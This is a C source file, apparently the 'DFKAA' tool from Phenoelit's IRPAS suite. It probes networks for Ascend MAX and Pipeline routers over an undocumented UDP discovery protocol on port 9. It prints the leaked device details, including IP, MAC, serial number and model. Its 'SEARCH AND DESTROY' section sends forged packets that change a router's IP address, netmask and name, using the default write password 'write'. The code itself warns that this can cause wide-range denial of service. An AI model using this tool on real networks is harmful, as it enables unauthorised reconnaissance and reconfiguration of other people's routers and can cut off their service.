/* DFKAA 
 * Devices Formerly Known As Ascend 
 *
 * FX <fx@phenoelit.de>
 * Phenoelit (http://www.phenoelit.de/)
 *
 * $Id: dfkaa.c,v 1.22 2001/10/21 17:19:33 fx Exp fx $
 *
 * 	This is the Trans-Atlantic part of IRPAS. Written 11300 meters
 * 	above the atlantic ocean, on the way from San Francisco to the
 * 	Phenoelit Solarophob Lab home in Germany at a speed of 950 km/h.
 * 	
 */

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>

#include <protocols.h>
#include <packets.h>
#include <build.h>
#include <enum.h>

typedef struct {
    u_int8_t		protover[2]	__attribute__ ((packed));	
    					/* ? - but good guess */
    u_int8_t		magic[4]	__attribute__ ((packed));	
    					/* magic number the NavisConnect tool 
					   sends out and the pipe copies 
					   07 a2 08 12 */
    u_int8_t		ipaddr[4]	__attribute__ ((packed));	
    u_int8_t		netmask[4]	__attribute__ ((packed));
    u_int8_t		serial[4]	__attribute__ ((packed)); 
    u_int8_t		macaddr[6]	__attribute__ ((packed));
    u_int8_t		group		__attribute__ ((packed)); 	
    					/* 0 = Unknown
					   1 = Multiband
					   2 = Max
					   3 = Pipeline */
    u_int8_t		devtype		__attribute__ ((packed));	
    u_int8_t		flag		__attribute__ ((packed));	
    u_int8_t		name[16]	__attribute__ ((packed));
    u_int8_t		sep1[1]		__attribute__ ((packed));
    u_int8_t		password[20]	__attribute__ ((packed));
    u_int8_t		sep2[1]		__attribute__ ((packed));
    u_int8_t		unknown[1]	__attribute__ ((packed));
    u_int16_t		feature1	__attribute__ ((packed));
    u_int16_t		feature2	__attribute__ ((packed));
    u_int16_t		feature3	__attribute__ ((packed));
    u_int16_t		feature4	__attribute__ ((packed));

    /* Features are (with some knowledge where to apply these ...) 
     * 	A)	MRATE = 128
     * 		X21 = 32
     * 		V24BIS = 16
     * 		RS366 = 8
     * 		Dynamic = 2
     * 		NBY = 1
     * 	C)	R2_SIGNALING = 128
     * 		DATACALL = 32
     * 		DUAL_SLOT_T1 = 16
     * 		MODEM_TSDIALOUT = 4
     * 		SERIAL_PORT_T1_CSU = 1
     *
     * 	don't know where these apply
     * 		IPSEC_UNKNOWN = -1;
     * 		IPSEC_NOTINST = 0;
     * 		IPSEC_AUTHONLY = 1;
     * 		IPSEC_40BIT = 2;
     * 		IPSEC_56BIT = 3;
     * 		IPSEC_UNLIMITED = 4;
     *
     */
} adp_t;	/* I call it Ascend Discovery Protcol - it does not work 
		   like CDP (Cisco Discovery Protocol), but leaks information
		   in the same way */

typedef struct {
    int major;
    int minor;
    char *name;
} ascend_device_t;

/* maximum number of defined major system id's */
#define MAX_MAJOR 3
/* the maximum minor number per major */
static int minors[MAX_MAJOR+1] = {0,0,11,28};
/* system id table */
static ascend_device_t table[] = {
    { 0, 0, "unknown - answer is 0.0"},

    { 1, 0, "Ascend Multiband - unknown model 0"},

    { 2, 0, "Ascend MAX - unknown model 0"},
    { 2, 1, "Ascend MAX 200"},
    { 2, 2, "Ascend MAX 1800"},
    { 2, 3, "Ascend MAX 2000"},
    { 2, 4, "Ascend MAX 4000"},
    { 2, 5, "Ascend MAX 4002"},
    { 2, 6, "Ascend MAX 4004"},
    { 2, 7, "Ascend MAX - unknown model 7"},
    { 2, 8, "Ascend MAX - unknown model 8"},
    { 2, 9, "Ascend MAX - unknown model 9"},
    { 2, 10, "Ascend MAX - unknown model 10"},
    { 2, 11, "Ascend DSL Terminator 100 (MAX 1800 chasis)"},

    { 3, 0 , "Ascend Pipeline - unknown model 0" },
    { 3, 1 , "Ascend Pipeline 15" },
    { 3, 2 , "Ascend Pipeline 25" },
    { 3, 3 , "Ascend Pipeline 25 Px" },
    { 3, 4 , "Ascend Pipeline 25 Fx" },
    { 3, 5 , "Ascend Pipeline 50" },
    { 3, 6 , "Ascend Pipeline 75" },
    { 3, 7 , "Ascend Pipeline 130" },
    { 3, 8 , "Ascend Pipeline 400" },
    { 3, 9 , "Ascend Pipeline 25 IP" },
    { 3, 10 , "Ascend Pipeline 25 IPX" },
    { 3, 11 , "Ascend Pipeline 50 BRI" },
    { 3, 12 , "Ascend Pipeline 50 S56" },
    { 3, 13 , "Ascend Pipeline 50 BRI FR" },
    { 3, 14 , "Ascend Pipeline 50AT" },
    { 3, 15 , "Ascend Pipeline 75AT" },
    { 3, 16 , "Ascend Pipeline 50 IPsec" },
    { 3, 17 , "Ascend Pipeline 75 IPsec" },
    { 3, 18 , "Ascend Pipeline DSL (CellPipe)" },
    { 3, 19 , "Ascend Pipeline 75 version 2" },
    { 3, 20 , "Ascend Pipeline - unknown type 20" },
    { 3, 21 , "Ascend Pipeline 130AT" },
    { 3, 22 , "Ascend Pipeline - unknown type 22" },
    { 3, 23 , "Ascend Pipeline 95 or DSL-50S-CELL" },
    { 3, 24 , "Ascend Pipeline 155" },
    { 3, 25 , "Ascend Pipeline DSL (CellPipe SDSL)" },
    { 3, 26 , "Ascend Pipeline - unknown type 26" },
    { 3, 27 , "Ascend Pipeline 155 V35 (SuperPipe)" },
    { 3, 28 , "Ascend Pipeline 155 E1 (SuperPipe)" },
}; 

int scan_ascend(int verbose);
void print_adp(adp_t *a,int verbose);
char *getdevname(int a, int b);

#define DEFAULT_PING_TIME	5
struct {
    int verbose;
    int flist;		/* list features if known - works only on MAX */
    int ping;		/* same as pingtimout on enum */
    int cont;		/* don't stop listening when one respond (for bcast) */

    int set;		/* set IP !!! */
    char *nname;	/* new name */
    char *pass;		/* SNMP write password */
    struct in_addr nip; /* new ip addr */
    struct in_addr nnm; /* new net mask */
} cfg;

int main(int argc,char **argv) {
    int		n=0;
    char	o;
    extern int	optind;
    extern char *optarg;
    // char	default24[] = "255.255.255.0";

    printf("DFKAA - Devices Formerly Known As Ascend\n"
	    "FX <fx@phenoelit.de> - http://www.phenoelit.de/\n"
	    "$Revision: 1.22 $ - IRPAS Build %s\n"
	    "(c) 2001++\n\n",BUILD);

    memset(&cfg,0,sizeof(cfg));
    cfg.ping=DEFAULT_PING_TIME;
    // inet_aton(default24,&(cfg.nnm));
    while ((o=getopt(argc,argv,"vfcp:S:P:I:M:N:"))!=EOF) {
	switch (o) {
	    case 'v':	cfg.verbose++;
			break;
	    case 'f':	cfg.flist++;
			break;
	    case 'c':	cfg.cont++;
			break;
	    case 'p':	cfg.ping=atoi(optarg);
			break;

	    case 'S':	cfg.set=1; /* force set */
			break;
	    case 'P':	cfg.pass=smalloc(strlen(optarg)+1);
			strcpy(cfg.pass,optarg);
			break;
	    case 'I':	if (inet_aton(optarg,&(cfg.nip))==0) {
			    fprintf(stderr,"%s is not a valid IP addr\n",
				    optarg);
			    exit(-1);
			}
			cfg.set=1;
			break;
	    case 'M':	if (inet_aton(optarg,&(cfg.nnm))==0) {
			    fprintf(stderr,"%s is not a valid netmask\n",
				    optarg);
			    exit(-1);
			}
			cfg.set=1;
			break;
	    case 'N':	cfg.nname=smalloc(strlen(optarg)+1);
			strcpy(cfg.nname,optarg);
			cfg.set=1;
			break;
	    default:	fprintf(stderr,"Usage ... well. Look into the .c\n");
			exit(1);
	}
    }

    if (getuid()!=0) { fprintf(stderr,"Requires root !\n"); return (1); }

    if (cfg.set==1) {
	cfg.cont=1;
	/* if setting, password defaults to "write" */
	if (cfg.pass==NULL) {
	    cfg.pass=smalloc(strlen("write")+1);
	    strcpy(cfg.pass,"write");
	}
    }
    
    if (optind==argc-1) {
	if (cfg.verbose) { 
	    printf("enumeration in progress ...\n"); 
	    fflush(stdout); 
	}
	if ((n=enumerate(argv[optind],
			cfg.ping, cfg.verbose))<0) {
	    printf("error in enumerate\n");
	} else {
	    if (cfg.verbose) {
		printf("%d potential targets found\n",n);
		enum_print();
	    }
	}
    } else {
	fprintf(stderr,"\n%s [-p <enum ping timeout>] [-v] [-c] [-f]\n"
		"\t[-P <password>] [-N <new name>] [-I <new ip>]"
		" [-M <new netmask>]\n\t<destination>\n\n"
		"\tIf timeout is >0, pings are used to enum\n"
		"\tIf timeout is 0, every host is probed\n",
		argv[0]);
    }

    if (n<=0) return (-1);
    if ((n>1)&&(cfg.set==1)) {
	fprintf(stderr,"\n\n----WARNING----\n\n"
		"\tconfiguration request for multiple targets\n"
		"\tTHIS MAY BE A WIDE RANGE DENIAL OF SERVICE ATTACK\n\n"
		"\tPress CTRL-C during the next 5 seconds\n\n");
		sleep(1); fprintf(stderr,"..4\n");
		sleep(1); fprintf(stderr,"..3\n");
		sleep(1); fprintf(stderr,"..2\n");
		sleep(1); fprintf(stderr,"..1\n");
		sleep(1); fprintf(stderr,"0\n");
    }

    if (scan_ascend(cfg.verbose)>(-1)) {
	printf("\nscan completed\n");
    }

    enum_free();
    return 0;
}


int scan_ascend(int verbose) {
#define TIMER	2
    int			udpsfd;
    int			icmps;
    adp_t		packet,answer,intruder;
    enum_target_t	*p;
    struct sockaddr_in	sin;
    struct sockaddr_in	frm;
    socklen_t		frmlen;
    unsigned long	t1;
    int			rlen,ilen;
    u_char		ipack[sizeof(iphdr_t)+sizeof(icmphdr_t)+64];
    icmphdr_t		*ic;
    iphdr_t		*ip2;
    udphdr_t		*udp2;
    int			setting_done;

    if ((udpsfd=socket(PF_INET,SOCK_DGRAM,IPPROTO_UDP))<0) {
	perror("socket()");
	return (-1);
    }
    if (makebcast(udpsfd)!=0) return (-1);
    makenonblock(udpsfd);
    memset(&packet,0,sizeof(packet));
    packet.magic[0]=0x07;
    packet.magic[1]=0xa2;
    packet.magic[2]=0x08;
    packet.magic[3]=0x12;

    if ((icmps=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0) {
	perror("socket(IPPROTO_ICMP)");
	return (-1);
    }
    makenonblock(icmps);
    memset(&ipack,0,sizeof(ipack));

    p=enum_anchor;
    while (p!=NULL) {
	memset(&answer,0,sizeof(answer));
	memset(&sin,0,sizeof(struct sockaddr_in));
	memset(&frm,0,sizeof(struct sockaddr_in));

	if (verbose) 
	    printf("Request to %s\n",inet_ntoa(p->addr));

	sin.sin_family=AF_INET;
	sin.sin_port=htons(9);	/* discard */
	memcpy(&(sin.sin_addr),&(p->addr),sizeof(sin.sin_addr));
	if (sendto(udpsfd,&packet,sizeof(packet),0,
		    (struct sockaddr *)&sin,
		    sizeof(struct sockaddr_in))<=0) {
	    perror("sendto()");
	    return(-1);
	}

	setting_done=0;
	t1=(unsigned long)time(NULL);
	while ((unsigned long)time(NULL)<(t1+TIMER)) {
	    
	    frmlen=sizeof(struct sockaddr_in);
	    if ((rlen=recvfrom(udpsfd,(void *)&answer,sizeof(answer),0,
			(struct sockaddr *)&frm,&frmlen))>0) {
		if (rlen<sizeof(adp_t)) {
		    fprintf(stderr,"Packet to short: %d\n",rlen);
		} else {
		    if (verbose) 
			printf("Answer from %s\n",inet_ntoa(frm.sin_addr));
		    print_adp(&answer,verbose);

		    /* +++++++++++++++++++
		     * SEARCH AND DESTROY 
		     * +++++++++++++++++++ */
		    if ((setting_done==0)&&(cfg.set==1)) {
			memcpy(&intruder,&answer,sizeof(answer));

			intruder.flag=2;
			if (*((u_int32_t *)&(cfg.nip.s_addr))!=0) {
			    memcpy(&(intruder.ipaddr),&(cfg.nip.s_addr),4);
			}
			if (*((u_int32_t *)&(cfg.nnm.s_addr))!=0) {
			    memcpy(&(intruder.netmask),&(cfg.nnm.s_addr),4);
			}
			if (cfg.nname!=NULL) {
			    memset(&(intruder.name),0,16);
			    memcpy(&(intruder.name),cfg.nname,
				    strlen(cfg.nname));
			}
			memcpy(&(intruder.password),cfg.pass,strlen(cfg.pass));

			sin.sin_family=AF_INET;
			sin.sin_port=htons(9);	/* discard */
			memcpy(&(sin.sin_addr),&(frm.sin_addr),
				sizeof(sin.sin_addr));
			if (sendto(udpsfd,&intruder,sizeof(intruder),0,
				    (struct sockaddr *)&sin,
				    sizeof(struct sockaddr_in))<=0) {
			    perror("sendto()");
			    return(-1);
			}
			setting_done=1;
		    }
		    if (!cfg.cont) break; /* out of while loop */
		}
	    }

	    frmlen=sizeof(struct sockaddr_in);
	    if ((ilen=recvfrom(icmps,(void *)&ipack,sizeof(ipack),0,
			(struct sockaddr *)&frm,&frmlen))>0) {
		/* ICMP message ... */
		ic=(icmphdr_t *)(((void *)&ipack)+sizeof(iphdr_t));
		ip2=(iphdr_t *)(((void *)&ipack)+sizeof(iphdr_t)+
			sizeof(icmphdr_t)+4);
		udp2=(udphdr_t *)(((void *)&ipack)+2*sizeof(iphdr_t)+
			sizeof(icmphdr_t)+4);
		if ((ic->type==ICMP_DEST_UNREACH)&&(ntohs(udp2->dport)==9)) {
		    if (ic->type==ICMP_UNREACH_PORT) {
			printf("HINT: %s reports port unreachable on",
				inet_ntoa(frm.sin_addr));
			printf(" %s\n",inet_ntoa(ip2->daddr));
		    } else if (ic->type==ICMP_UNREACH_ADMIN1) {
			printf("%s reports filter for",
				inet_ntoa(frm.sin_addr));
			printf(" %s\n",inet_ntoa(ip2->daddr));
		    } else if (ic->type==ICMP_UNREACH_FIREWALL) {
			printf("%s reports filter (FW) for",
				inet_ntoa(frm.sin_addr));
			printf(" %s\n",inet_ntoa(ip2->daddr));
		    }
		}
	    }
		
	}
	p=p->next;
    }

    close(udpsfd);
    close(icmps);
    return 0;
}

void print_adp(adp_t *a,int verbose) {
    char		buf[17];
    struct in_addr	addr;

    memset(&buf,0,sizeof(buf));
    /* name */
    memcpy((char *)&buf,(char *)&(a->name),16);
    printf(">>%s<<\n",buf);
    /* answer */ 
    switch (a->flag) {
	case 0:	printf("\t[Probe packet]\n"); break;
	case 1:	printf("\t[Probe response]\n"); break;
	case 2:	printf("\t[Write access requested]\n"); break;
	case 3:	printf("\t[Write access granted]\n"); break;
	case 4:	printf("\t[Write access denied - wrong password]\n"); break;
	case 5:	printf("\t[Write access denied - general]\n"); break;
	default: printf("\t[FLAG UNKNOWN]\n"); 
    }
    /* proto */
    printf("\tADP version:\t%d\n",*((u_int16_t *)&(a->protover)));
    /* MAC */
    printf("\tMAC addr:\t%02X:%02X:%02X:%02X:%02X:%02X\n",
	    a->macaddr[0], a->macaddr[1], a->macaddr[2],
	    a->macaddr[3], a->macaddr[4], a->macaddr[5]);
    /* IP */
    memcpy(&addr,&(a->ipaddr),4);
    printf("\tIP addr:\t%s/",inet_ntoa(addr));
    /* netmask */
    memcpy(&addr,&(a->netmask),4);
    printf("%s\n",inet_ntoa(addr));
    /* serial */
    printf("\tSerial number:\t%d\n",ntohl(*((u_int32_t *)&(a->serial))));

    /* Device type */
    printf("\tDevice type:\t");
    if (a->group>MAX_MAJOR) { 
	printf("TOTALY UNKNOWN %d.%d\n",a->group,a->devtype);
	printf("If you know what type it is, send email to fx@phenoelit.de\n");
    } else {
	if (a->devtype>minors[a->group]) {
	    switch (a->group) {
		case 0: printf("error reported\n");
			break;
		case 1: printf("Multiband device number %d\n",a->devtype);
			break;
		case 2: printf("Ascend MAX device number %d\n",a->devtype);
			break;
		case 3: printf("Ascend Pipeline device number %d\n",a->devtype);
			break;
	    }

	    printf("If you know what type it is,"
		    " send email to fx@phenoelit.de\n");
	} else {
	    /* OK, ok - we know it */
	    printf("%s\n",getdevname(a->group,a->devtype));
	}
    }

    printf("\tFeatures:\t%04x %04x %04x %04x\n",
	    htons(a->feature1),htons(a->feature2),
	    htons(a->feature3),htons(a->feature4));
    if (cfg.flist) {
	if ((htons(a->feature1)&128)>0) printf("\t\t\t* MRATE\n");
	if ((htons(a->feature1)&32)>0) printf("\t\t\t* X21\n");
	if ((htons(a->feature1)&16)>0) printf("\t\t\t* V24BIS\n");
	if ((htons(a->feature1)&8)>0) printf("\t\t\t* RS366\n");
	if ((htons(a->feature1)&2)>0) printf("\t\t\t* Dynamic\n");
	if ((htons(a->feature1)&1)>0) printf("\t\t\t* NBY\n");

	if ((htons(a->feature3)&128)>0) printf("\t\t\t* R2 Signaling\n");
	if ((htons(a->feature3)&32)>0) printf("\t\t\t* DATACALL\n");
	if ((htons(a->feature3)&16)>0) printf("\t\t\t* Dual-Slot T1\n");
	if ((htons(a->feature3)&4)>0) printf("\t\t\t* Modem TS Dialout\n");
	if ((htons(a->feature3)&1)>0) printf("\t\t\t* Serial Port T1 CSU\n");
    }
}

char *getdevname(int a,int b) {
    int 	i;
    int		known_devs=0;

    for (i=0;i<=MAX_MAJOR;i++) known_devs+=minors[i]+1;

    for (i=0;i<known_devs;i++) {
	if (
		(table[i].major==a)
		&&
		(table[i].minor==b)
		) {
	    return table[i].name;
	}
    }

    return NULL;
}
